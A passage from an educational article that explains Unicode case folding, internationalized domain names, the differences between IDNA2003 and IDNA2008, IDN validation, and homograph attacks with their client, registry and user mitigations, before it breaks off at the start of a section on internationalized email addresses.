Since <abbr title="Domain Name System">DNS</abbr> servers don’t know about <a href="#punycode-encoding">Punycode</a>
and Punycode encodes non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> uppercase and lowercase letters differently,
<a href="#internationalized-domain-names">internationalized domain names</a> have to be case-normalized on the client-side
because users expect that case-insensitivity also applies to internationalized domain names,
such as <a href="http://ÖBB.at">ÖBB.at</a> and <a href="http://öbb.at">öbb.at</a>.</p>

  <p>Unicode distinguishes between <a href="https://unicode.org/faq/casemap_charprop.html#2">case mapping and case folding</a>.
The former maps characters to their lowercase, uppercase,
or <a href="https://en.wikipedia.org/wiki/Title_case">titlecase</a> equivalent,
while the latter tries to “remove” the case for case-insensitive comparisons of text.
If uppercase and lowercase letters had a <a href="https://en.wikipedia.org/wiki/Bijection">one-to-one correspondence</a>,
we could simply lowercase both strings before comparing them.
Unfortunately, this doesn’t work for Unicode strings
even if we <a href="#unicode-normalization"><abbr title="Normalization Form Compatibility Composition (for Unicode strings)">NFKC</abbr>-normalize</a> both of them
to get rid of <a href="https://en.wikipedia.org/wiki/Orthographic_ligature">ligatures</a>.
(The problem with ligatures is that they often exist only in lowercase,
which means that <code>&#39;ﬀ&#39;.toUpperCase()</code> <code>===</code> <code>&#39;FF&#39;</code> and <code>&#39;ﬀ&#39;.toUpperCase().toLowerCase()</code> <code>!==</code> <code>&#39;ﬀ&#39;</code>.)
The two examples why lowercasing isn’t enough for Unicode strings are
the <a href="https://en.wikipedia.org/wiki/%C3%9F">German eszett <code>ß</code></a> and
the <a href="https://en.wikipedia.org/wiki/Sigma">Greek sigma <code>ς</code></a>.
The former existed only in lowercase until 2017,
at which point the <a href="https://en.wikipedia.org/wiki/Capital_%E1%BA%9E">capital eszett <code>ẞ</code></a> was officially adopted.
While the capital eszett has already been added to Unicode
with the code point <a href="https://unicode-table.com/en/1E9E/">1E9E</a> in 2008,
the capitalization of <code>ß</code> is still defined as <code>SS</code>:
<code>&#39;ß&#39;.toUpperCase()</code> <code>===</code> <code>&#39;SS&#39;</code> but <code>&#39;ẞ&#39;.toLowerCase()</code> <code>===</code> <code>&#39;ß&#39;</code>.
Therefore, neither <code>x.toUpperCase().toLowerCase()</code> <code>===</code> <code>x</code> nor
<code>x.toLowerCase().toUpperCase()</code> <code>===</code> <code>x</code> is true in general.
The lowercase sigma <code>ς</code> is used only at the <a href="https://en.wikipedia.org/wiki/Final_form">end of words</a>.
Within words, <code>σ</code> is used.
Since there is only one uppercase sigma,
both <code>&#39;ς&#39;.toUpperCase()</code> <code>===</code> <code>&#39;Σ&#39;</code> and <code>&#39;σ&#39;.toUpperCase()</code> <code>===</code> <code>&#39;Σ&#39;</code>.
And since Unicode maps the case of characters without considering their context, <code>&#39;Σ&#39;.toLowerCase()</code> <code>===</code> <code>&#39;σ&#39;</code>.
For these reasons, <code>ß</code> is mapped to <code>ss</code> and <code>ς</code> to <code>σ</code> before case-insensitive string comparisons.
Since case folding is <a href="https://www.unicode.org/policies/stability_policy.html#Case_Folding">guaranteed to be stable</a>,
this won’t change in future <a href="https://en.wikipedia.org/wiki/Unicode#Versions">Unicode versions</a>.</p>

  <p>A few additional remarks:</p>
  <ul>
    <li><strong>Duplications</strong>: In order to keep case operations as context-independent as possible,
the <a href="https://en.wikipedia.org/wiki/Latin_alphabet">Latin</a>,
<a href="https://en.wikipedia.org/wiki/Greek_alphabet">Greek</a>,
and <a href="https://en.wikipedia.org/wiki/Cyrillic_script">Cyrillic</a> scripts
have <a href="https://www.unicode.org/notes/tn26/">separate code points in Unicode</a>
even for optically identical characters.
For example, Unicode has a <a href="https://unicode-table.com/en/0042/">Latin <code>B</code></a>,
a <a href="https://unicode-table.com/en/0392/">Greek <code>Β</code></a>,
and a <a href="https://unicode-table.com/en/0412/">Cyrillic <code>В</code></a>,
which map to <a href="https://unicode-table.com/en/0062/"><code>b</code></a>,
<a href="https://unicode-table.com/en/03B2/"><code>β</code></a>,
and <a href="https://unicode-table.com/en/0432/"><code>в</code></a>.
While this is great for case operations,
it’s <a href="#homograph-attack">bad for internationalized domain names</a>.</li>
    <li><strong>Localization</strong>: For some characters, the case mapping still depends on the language.
This is why JavaScript has a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/toLocaleLowerCase"><code>toLocaleLowerCase</code></a>
and a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/toLocaleUpperCase"><code>toLocaleUpperCase</code></a> method.
For example, in the <a href="https://en.wikipedia.org/wiki/Turkish_language">Turkish language</a>,
<code>&#39;I&#39;.toLocaleLowerCase(&#39;tr&#39;)</code> <code>===</code> <a href="https://unicode-table.com/en/0131/"><code>&#39;ı&#39;</code></a> and
<code>&#39;i&#39;.toLocaleUpperCase(&#39;tr&#39;)</code> <code>===</code> <a href="https://unicode-table.com/en/0130/"><code>&#39;İ&#39;</code></a>.</li>
    <li><strong>Titlecase</strong>: <a href="https://en.wikipedia.org/wiki/Digraph_(orthography)">Digraphs</a>,
such as the <a href="https://en.wikipedia.org/wiki/D%C5%BE">dž</a> used in Eastern European alphabets,
usually exist in lowercase, uppercase, and
<a href="https://en.wikipedia.org/wiki/Capitalization#Digraphs_and_ligatures">titlecase</a>.
For example, Unicode defines <a href="https://unicode-table.com/en/01C6/">ǆ</a>,
<a href="https://unicode-table.com/en/01C4/">Ǆ</a>, and <a href="https://unicode-table.com/en/01C5/">ǅ</a>.
The Dutch digraph <a href="https://en.wikipedia.org/wiki/IJ_(digraph)">ij</a>, on the other hand,
is capitalized together, such as in <a href="https://en.wikipedia.org/wiki/IJsselmeer">IJsselmeer</a>,
which is why only <a href="https://unicode-table.com/en/0133/">ĳ</a>
and <a href="https://unicode-table.com/en/0132/">Ĳ</a> exist.
Since digraphs are usually written as two separate characters in practice,
titlecase algorithms which simply capitalize the first letter get this wrong.</li>
  </ul>

</details>

<details>
  <summary id="internationalized-domain-names">
Internationalized domain names (<abbr title="Internationalized Domain Names">IDNs</abbr>)
</summary>

  <p>Now that we know what <a href="#punycode-encoding">Punycode</a>, <a href="#unicode-normalization">Unicode normalization</a>,
and <a href="#unicode-case-folding">case folding</a> are, we’re finally ready to discuss
<a href="https://en.wikipedia.org/wiki/Internationalized_domain_name">internationalized domain names (<abbr title="Internationalized Domain Names">IDNs</abbr>)</a>.
As you might <a href="https://evalapply.org/internet/#domain-name-system">remember</a>,
domain names consist of labels, which are separated by a dot.
Each label of a domain name is internationalized separately.
In order to distinguish Punycode-encoded labels from ordinary labels,
Punycode-encoded labels are prefixed with <code>xn--</code>.
This is known as the <abbr title="American Standard Code for Information Interchange">ASCII</abbr>-Compatible Encoding (<abbr title="ASCII-Compatible Encoding (of domain names)">ACE</abbr>) prefix.
A label may be Punycode-encoded only if it contains non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters.
This ensures that Punycode-encoded labels never end with a hyphen.
(The <a href="https://datatracker.ietf.org/doc/html/rfc1035#section-2.3.1">preferred name syntax</a>
requires that labels neither start nor end with a hyphen.)
Each Punycode-encoded label may be at most 63 characters long, including the <abbr title="ASCII-Compatible Encoding (of domain names)">ACE</abbr> prefix.
If the encoding of a Unicode label is longer, the user input must be rejected.</p>

  <p>What makes internationalized domain names even more complicated is that there are two versions: <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr> &amp; <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr>.
(<abbr title="Internationalized Domain Names for Applications">IDNA</abbr> stands for Internationalized Domain Names for Applications.)
<abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr> supersedes <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr>, which means that <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr> should no longer be used.
Since a lot of the confusion comes from the differences between them, we’ll look at both:</p>

  <ul>
    <li><strong><abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr></strong>: <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr> is specified in <a href="https://datatracker.ietf.org/doc/html/rfc3490"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3490</a>.
It uses the <a href="https://en.wikipedia.org/wiki/Nameprep">Nameprep</a> profile
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc3491"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3491</a>
of the Stringprep algorithm, which is specified in <a href="https://datatracker.ietf.org/doc/html/rfc3454"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3454</a>.
Nameprep prepares an arbitrary user input to be encoded with Punycode:</li>
  </ul>

  <figure>
    <svg id="figure-idna2003" data-name="idna2003" width="214.518" height="423" viewBox="-107.259 -1.25 214.518 423" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="0" y1="357.313" x2="0" y2="379.75" marker-end="url(#arrow)" stroke-dasharray="15"></line>
    <line x1="0" y1="293.813" x2="0" y2="316.25" marker-end="url(#arrow)" stroke-dasharray="15"></line>
    <line x1="0" y1="230.313" x2="0" y2="252.75" marker-end="url(#arrow)" stroke-dasharray="15"></line>
    <line x1="0" y1="166.813" x2="0" y2="189.25" marker-end="url(#arrow)" stroke-dasharray="15"></line>
    <line x1="0" y1="103.313" x2="0" y2="125.75" marker-end="url(#arrow)" stroke-dasharray="15"></line>
    <line x1="0" y1="39.813" x2="0" y2="62.25" marker-end="url(#arrow)" stroke-dasharray="15"></line>
    <rect x="-81.537" y="0" width="163.074" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="25.65">Arbitrary user input</tspan>
    </text>
    <rect x="-105.553" y="63.5" width="211.106" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="89.15">Remove certain characters</tspan>
    </text>
    <rect x="-92.777" y="127" width="185.554" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="152.65">Case fold all characters</tspan>
    </text>
    <rect x="-106.009" y="190.5" width="212.018" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="216.15"><tspan>nfkc</tspan>-normalize the labels</tspan>
    </text>
    <rect x="-99.195" y="254" width="198.39" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="279.65">Reject certain characters</tspan>
    </text>
    <rect x="-91.369" y="317.5" width="182.738" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="343.15">Encode with Punycode</tspan>
    </text>
    <rect x="-90.057" y="381" width="180.114" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="406.65">Domain name in <tspan>ascii</tspan></tspan>
    </text>

</svg>

    <figcaption>

How <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr> normalizes user input.
The normalization fails only if the output contains <a href="https://datatracker.ietf.org/doc/html/rfc3454#section-5">prohibited characters</a>
or violates the <a href="https://datatracker.ietf.org/doc/html/rfc3454#section-6">rules for bidirectional text</a>.

</figcaption>
  </figure>

  <ul>
    <li><strong><abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr></strong>: <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr> is specified in <a href="https://datatracker.ietf.org/doc/html/rfc5890"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5890</a>,
<a href="https://datatracker.ietf.org/doc/html/rfc5891"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5891</a>,
<a href="https://datatracker.ietf.org/doc/html/rfc5892"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5892</a>,
<a href="https://datatracker.ietf.org/doc/html/rfc5893"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5893</a>,
and <a href="https://datatracker.ietf.org/doc/html/rfc5894"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5894</a>.
Instead of prohibiting certain characters,
<abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr> accepts only characters with specific <a href="https://en.wikipedia.org/wiki/Unicode_character_property">properties</a>,
which makes it easier to migrate to newer versions of Unicode.
(<abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr> used Unicode version 3.2 only.)
Additionally, <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr> no longer specifies how characters are to be mapped,
it only <a href="https://datatracker.ietf.org/doc/html/rfc5894#section-4.2">encourages applications</a> to meet user expectations.
Removing the mapping of characters from the standard allows applications to map them
<a href="https://datatracker.ietf.org/doc/html/rfc5894#section-4.3">according to the language which is being used</a>.
Since the <abbr title="Internationalized Domain Names for Applications">IDNA</abbr> standard is the same around the globe,
it cannot consider the local context for character mappings.</li>
  </ul>

  <figure>
    <svg id="figure-idna2008" data-name="idna2008" width="364.156" height="423" viewBox="-182.078 -1.25 364.156 423" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="0" y1="357.313" x2="0" y2="379.75" marker-end="url(#arrow)" stroke-dasharray="15"></line>
    <line x1="0" y1="293.813" x2="0" y2="316.25" marker-end="url(#arrow)" stroke-dasharray="15"></line>
    <line x1="0" y1="230.313" x2="0" y2="252.75" marker-end="url(#arrow)" stroke-dasharray="15"></line>
    <line x1="0" y1="166.813" x2="0" y2="189.25" marker-end="url(#arrow)" stroke-dasharray="15"></line>
    <line x1="0" y1="103.313" x2="0" y2="125.75" marker-end="url(#arrow)" stroke-dasharray="15"></line>
    <line x1="0" y1="39.813" x2="0" y2="62.25" marker-end="url(#arrow)" stroke-dasharray="15"></line>
    <rect x="-81.537" y="0" width="163.074" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="25.65">Arbitrary user input</tspan>
    </text>
    <rect x="-145.996" y="63.5" width="291.991" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="89.15">Reject symbols and punctuation marks</tspan>
    </text>
    <rect x="-157.052" y="127" width="314.104" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="152.65">Lowercase or reject uppercase characters</tspan>
    </text>
    <rect x="-180.828" y="190.5" width="361.656" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="216.15"><tspan>nfkc</tspan>-normalize or reject non-normalized labels</tspan>
    </text>
    <rect x="-110.025" y="254" width="220.05" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="279.65">Accept only valid characters</tspan>
    </text>
    <rect x="-91.369" y="317.5" width="182.738" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="343.15">Encode with Punycode</tspan>
    </text>
    <rect x="-90.057" y="381" width="180.114" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="0" y="406.65">Domain name in <tspan>ascii</tspan></tspan>
    </text>

</svg>

    <figcaption>
How <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr> normalizes user input.
The steps in gray are required but not standardized.
</figcaption>
  </figure>

  <p>So how does <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr> differ from <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr>? Let’s look at a few examples:</p>
  <ul>
    <li><a href="https://en.wikipedia.org/wiki/Unicode_symbols"><strong>Symbols</strong></a>:
<a href="https://util.unicode.org/UnicodeJsps/idna.jsp?a=P%E2%89%A0NP.org"><code>P≠NP.org</code></a> was valid under <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr>
but is no longer valid under <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr> since symbols are no longer allowed.
(Due to the <a href="#punycode-encoding">limitations of Punycode</a>,
<a href="https://util.unicode.org/UnicodeJsps/idna.jsp?a=P%3DNP.org"><code>P=NP.org</code></a>, on the other hand, was never valid.)
Disallowing symbols also prevents attackers from faking <a href="https://en.wikipedia.org/wiki/URL#Syntax"><abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr> separators</a>
in domain names, which is a special variant of a <a href="#homograph-attack">homograph attack</a>.
For example,
<a href="https://util.unicode.org/UnicodeJsps/idna.jsp?a=ef1p.com%E2%88%95email.article.example"><code>ef1p.com∕email.article.example</code></a>,
which uses a <a href="https://unicode-table.com/en/2215/">division slash</a> in the domain label <code>com∕email</code>
under the top-level domain <a href="https://en.wikipedia.org/wiki/.example"><code>.example</code></a>,
was also valid under <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr> but is no longer valid under <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr>.</li>
    <li><a href="https://en.wikipedia.org/wiki/Emoji"><strong>Emojis</strong></a>:
Being a kind of symbol, emojis were allowed in <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr> but are no longer allowed in <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr>.
Since <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr> was limited to Unicode version 3.2, only a tiny subset of emojis could be used,
namely those which were originally added as text characters
(mostly in <a href="https://emojipedia.org/unicode-1.1/">Unicode version 1.1</a> in 1993)
and given an <a href="https://en.wikipedia.org/wiki/Emoji#Emoji_versus_text_presentation">emoji presentation</a> in 2010.
The <a href="https://en.wikipedia.org/wiki/Variation_Selectors_(Unicode_block)">variation selector 16</a>
was added to Unicode in version 3.2 <a href="#unicode-normalization">to render text symbols as emojis</a>;
just in time for <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr>.
As a consequence, <a href="https://util.unicode.org/UnicodeJsps/idna.jsp?a=%E2%9D%A4%EF%B8%8F.com">❤️.com</a>
was once valid while <a href="https://util.unicode.org/UnicodeJsps/idna.jsp?a=%F0%9F%92%99.com">💙.com</a> never was.
Emojis were intentionally disallowed in <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr> because humans likely confuse different emojis
even without <a href="https://en.wikipedia.org/wiki/Combining_character">combining characters</a>,
such as skin tones and hair styles.
For example, <a href="https://unicode-table.com/en/2764/">❤</a> 
and <span><a href="https://unicode-table.com/en/2665/">♥️</a></span> 
are two different hearts, where both of them were
<a href="https://util.unicode.org/UnicodeJsps/idna.jsp?a=%E2%9D%A4%EF%B8%8F.com%0D%0A%E2%99%A5%EF%B8%8F.com">valid under <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr></a>.</li>
    <li><a href="https://en.wikipedia.org/wiki/%C3%9F"><strong>German eszett ß</strong></a>:
In <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr>, <code>ß</code> was <a href="#unicode-case-folding">case-folded</a> to <code>ss</code>.
For example, <code>Gießen.de</code> was transformed to <code>giessen.de</code> before making the <abbr title="Domain Name System">DNS</abbr> lookup.
Since <code>ß</code> is allowed in <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr>, <code>Gießen.de</code> is now transformed to <code>xn--gieen-nqa.de</code>.</li>
    <li><a href="https://en.wikipedia.org/wiki/Sigma"><strong>Greek sigma ς</strong></a>:
Similarly, <code>ς</code> was case-folded to <code>σ</code> in <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr> but is now allowed in <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr>.
For example, <code>ἑλλάς.gr</code> was transformed to <code>xn--hxa3aa7a0420a.gr</code> in <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr>
and is now transformed to <code>xn--hxa3aa3a0982a.gr</code> in <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr>.</li>
  </ul>

  <p>Since some characters that were previously removed,
such as the <a href="https://en.wikipedia.org/wiki/Zero-width_joiner">zero-width joiner</a>,
are now allowed <a href="https://datatracker.ietf.org/doc/html/rfc5894#section-3.1.2">in certain contexts</a>
and other characters, such as <code>ß</code> and <code>ς</code>, are no longer mapped,
some internationalized domain names are <a href="https://datatracker.ietf.org/doc/html/rfc5894#section-7.2">interpreted differently</a>
under <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr> than under <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr>.
These changes require a <a href="https://datatracker.ietf.org/doc/html/rfc5894#section-7.2.3">transition period</a> from <abbr title="Internationalized Domain Names for Applications version 1 completed in 2003">IDNA2003</abbr> to <abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr>,
where <a href="https://en.wikipedia.org/wiki/Domain_name_registry">domain name registries</a>
reserve the newer mapping of an internationalized domain name for the registrant of the older mapping,
bundle different mappings of a new registration,
or block the registration of deviating mappings.
You can read more about compatibility processing of internationalized domain names
in the <a href="https://www.unicode.org/reports/tr46/">Unicode Technical Standard 46</a>
and the <a href="https://www.unicode.org/faq/idn.html"><abbr title="Internationalized Domain Name">IDN</abbr> <abbr title="Frequently Asked Questions">FAQ</abbr></a>.</p>

</details>

<details>
  <summary id="idna2008-validation">
<abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr> validation
</summary>

  <p>Unfortunately, there is <a href="https://github.com/mathiasbynens/todo/issues/9">no JavaScript library</a>
to validate <a href="#internationalized-domain-names">internationalized domain names</a>.
I’ve approximated the <a href="https://datatracker.ietf.org/doc/html/rfc5894#section-3.1.3"><abbr title="Internationalized Domain Names for Applications version 2 completed in 2008">IDNA2008</abbr> rules</a>
in the <a href="#punycode-encoding">Punycode tool</a>
<a href="https://github.com/KasparEtter/ef1p/blob/main/code/tools/encoding/punycode.tsx">as follows</a>:
<code>/^[\p{Letter}\p{Number}][\p{Letter}\p{Mark}\p{Number}\p{Join_Control}]*(?:-+[\p{Letter}\p{Number}][\p{Letter}\p{Mark}\p{Number}\p{Join_Control}]*)*(?:\.[\p{Letter}\p{Number}][\p{Letter}\p{Mark}\p{Number}\p{Join_Control}]*(?:-+[\p{Letter}\p{Number}][\p{Letter}\p{Mark}\p{Number}\p{Join_Control}]*)*)*$/u</code>.</p>

  <p>This regular expression uses <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions/Unicode_Property_Escapes">Unicode property escapes</a>
and is easier to read as <code>/^LD(?:-+LD)*(?:\.LD(?:-+LD)*)*$/u</code>,
where <code>LD</code> is <code>[\p{Letter}\p{Number}][\p{Letter}\p{Mark}\p{Number}\p{Join_Control}]*</code>.
If your input matches the regular expression,
I <a href="#unicode-case-folding">lowercase</a> your input,
<a href="#unicode-normalization"><abbr title="Normalization Form Compatibility Composition (for Unicode strings)">NFKC</abbr> normalize</a> it, and
make sure that the Unicode normalization has introduced no additional dots,
such as <a href="#tool-encoding-normalization&amp;input=%E2%92%88&amp;normalization=NFKC">⒈ → 1.</a>.
After <a href="#punycode-encoding">Punycode encoding</a> the internationalized domain,
I also check that each label of the domain name consists of at most 63 characters.
If you have a suggestion for how I can improve my validation, <a href="mailto:contact@ef1p.com">let me know</a>.</p>

</details>

<details>
  <summary id="homograph-attack">
Homograph attack
</summary>

  <p>Domain names which look identical but resolve to different addresses are a serious security issue.
For example, the lowercase letter l, the uppercase letter I, and the number 1
can easily be mistaken for one another depending on the font,
and so can the capital letter O and the number 0.
While the problem already existed with <abbr title="American Standard Code for Information Interchange">ASCII</abbr>-only domain names,
internationalized domain names made the situation considerably worse.
For example, the <a href="https://unicode-table.com/en/0042/">Latin <code>B</code></a>,
the <a href="https://unicode-table.com/en/0392/">Greek <code>Β</code></a>,
and the <a href="https://unicode-table.com/en/0412/">Cyrillic <code>В</code></a> all look the same.
While <a href="http://BBC.com"><abbr title="British Broadcasting Corporation">BBC</abbr>.com</a> takes you to the website of the
<a href="https://en.wikipedia.org/wiki/BBC">British Broadcasting Corporation (<abbr title="British Broadcasting Corporation">BBC</abbr>)</a>,
<a href="http://ВВС.com" rel="nofollow">ВВС.com</a> takes you to a completely different website.
Deceiving users with optically similar characters in order to obtain sensitive information
is known as a <a href="https://en.wikipedia.org/wiki/IDN_homograph_attack">homograph attack</a>.
While <a href="#phishing">phishing</a> cannot be fully eliminated,
such attacks can be mitigated by the client, the registry, and the user:</p>
  <ul>
    <li><a href="https://en.wikipedia.org/wiki/IDN_homograph_attack#Client-side_mitigation"><strong>Client</strong></a>:
Browsers and mail clients should warn the user about suspicious domain names
and display such domain names in Punycode/<abbr title="American Standard Code for Information Interchange">ASCII</abbr> rather than Unicode.
Domain names are suspicious when they use characters which don’t belong to the user’s preferred language
or when they mix characters from different scripts.
Additionally, it’s a good idea to lowercase and normalize domain names before displaying them
in a font which clearly distinguishes between visually similar characters.</li>
    <li><a href="https://en.wikipedia.org/wiki/IDN_homograph_attack#Server-side/registry_operator_mitigation"><strong>Registry</strong></a>:
Domain name registries should develop <a href="https://datatracker.ietf.org/doc/html/rfc5894#section-3.2">registration policies</a>
for their <a href="https://en.wikipedia.org/wiki/Top-level_domain">top-level domains</a>.
Registries are free to permit characters only from certain
<a href="https://en.wikipedia.org/wiki/Script_(Unicode)#List_of_scripts_in_Unicode">scripts</a>
or not to support internationalized domain names at all.
For example, the Russian top-level domain <a href="https://en.wikipedia.org/wiki/.%D1%80%D1%84">.рф</a>
permits only subdomains in the <a href="https://en.wikipedia.org/wiki/Cyrillic_script">Cyrillic script</a>.
Registries which allow the use of different scripts should ensure
that the different scripts cannot be mixed in a single label.
The <a href="https://www.unicode.org/reports/tr39/">Unicode Technical Standard 39</a>
with its <a href="https://www.unicode.org/Public/security/latest/">data set</a>
contains more information about confusable characters.
On top of this, registries should bundle or block variants of the same word
as outlined in <a href="https://datatracker.ietf.org/doc/html/rfc4290"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4290</a>.
Wikipedia lists <a href="https://en.wikipedia.org/wiki/List_of_Internet_top-level_domains">which top-level domains support <abbr title="Internationalized Domain Names">IDNs</abbr></a>
and which top-level domains are <a href="https://en.wikipedia.org/wiki/List_of_Internet_top-level_domains#Internationalized_country_code_top-level_domains">internationalized themselves</a>.</li>
    <li><a href="https://en.wikipedia.org/wiki/Phishing#User_training"><strong>User</strong></a>:
Users should be trained to recognize phishing attempts
and to always enter the address of important online services themselves instead of following a link.
In the above example, the fact that <code>ВВС.com</code> looks just like <code>BBC.com</code> is not a problem
if users enter the perceived address into the address field rather than copying it there.</li>
  </ul>

</details>

<details>
  <summary id="email-address-internationalization">
Email address internationalization (<abbr title="Email Address Internationalization">EAI</abbr>)
</summary>

  <p>So far, we have seen how non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters can be encoded in the <a href="#content-encoding">message body</a>,
in <a href="#header-encoding">header fields</a> and in <a href="#internationalized-domain-names">domain names</a>.
The only thing that is missing is the internationalization
of the <a href="#address-syntax">local part</a> of <a href="#address">email addresses</a>.
This is achieved by the following <abbr title="Requests for Comments, published by the Internet Engineering Task Force (IETF)">RFCs</abbr>, which extend the <a href="#protocols">email protocols</a>
and the <a href="#format">message format</a> to allow Unicode characters encoded in <abbr title="Unicode Transformation Format">UTF</abbr>-8 everywhere:</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6530"><strong><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6530</strong></a>
introduces the framework for internationalized email.
It explains the <a href="https://datatracker.ietf.org/doc/html/rfc6530#section-3">problem</a> and
defines the <a href="https://datatracker.ietf.org/doc/html/rfc6530#section-4">used terminology</a>.
Unlike <a href="https://datatracker.ietf.org/doc/html/rfc6530#section-6">earlier proposals</a>,
<a href="https://datatracker.ietf.org/doc/html/rfc6530#section-4.6">internationalized messages</a>
are no longer <a href="https://datatracker.ietf.org/doc/html/rfc6530#section-9">downgraded in transit</a>
because the local part of an address is to be interpreted
<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-2.3.11">only by the host specified in the domain part of the address</a>.
If an intermediary mail server doesn’t support <abbr title="Unicode Transformation Format">UTF</abbr>-8,
the message has to be <a href="#bounce-messages">returned to the sender</a>.
If an internationalized message shall be delivered to legacy mail servers,
it has to be <a href="https://datatracker.ietf.org/doc/html/rfc6530#section-8.1">downgraded before or during message submission</a>.
Additionally, the incoming mail server of the recipient may
<a href="https://datatracker.ietf.org/doc/html/rfc6530#section-8.2">downgrade messages after the final delivery</a>
so that they can be retrieved by legacy mail clients of the recipient (see the points below).
The <a href="https://datatracker.ietf.org/doc/html/rfc6530#section-10.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr></a> recommends that
incoming mail servers <a href="#unicode-normalization">normalize</a> the local part of an email address
ideally to <abbr title="Normalization Form Compatibility Composition (for Unicode strings)">NFKC</abbr> but at least to <abbr title="Normalization Form (Canonical) Composition (for Unicode strings)">NFC</abbr> as part of the <a href="#normalization">address normalization</a>.
Senders, however, <a href="https://datatracker.ietf.org/doc/html/rfc6532#section-3.1">should not normalize the addresses of recipients</a>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6531"><strong><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6531</strong></a>
